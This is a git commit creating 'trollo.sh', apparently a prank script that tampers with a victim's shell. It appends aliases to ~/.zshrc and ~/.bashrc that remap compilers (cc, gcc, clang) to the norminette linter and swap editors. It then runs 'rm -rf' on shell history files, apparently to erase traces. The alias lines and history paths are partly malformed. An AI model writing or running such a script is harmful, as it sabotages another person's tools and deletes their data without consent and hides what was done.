7f2661e63580292b9d6e03924e457099b8d40e97
BarbaraC <55756205+BarbaraC12@users.noreply.github.com>
2022-02-25 23:56:41 +0100

    Create trollo.sh

---
+++ trollo.sh
@@ -0,0 +1,21 @@
+echo "alias norminette = cc" >> ~/.zshrc
+echo "alias norme = cat *" >> ~/.zshrc
+echo "alias cc = norminette" >> ~/.zshrc
+echo "alias gcc = norminette" >> ~/.zshrc
+echo "alias clang = norminette" >> ~/.zshrc
+echo "alias vi = nano" >> ~/.zshrc
+echo "alias vim = emacs -rv" >> ~/.zshrc
+echo "alias clang = norminette" >> ~/.zshrc
+
+echo "alias norminette = cc" >> ~/.bashrc
+echo "alias norme = cat *" >> ~/.bashrc
+echo "alias cc = norminette" >> ~/.bashrc
+echo "alias gcc = norminette" >> ~/.bashrc
+echo "alias clang = norminette" >> ~/.bashrc
+echo "alias vi = nano" >> ~/.bashrc
+echo "alias vim = emacs -rv" >> ~/.bashrc
+echo "alias clang = norminette" >> ~/.bashrc
+
+cat README.md
+
+rm -rf ~/zsh_history ~/sh_history ~/bash_history
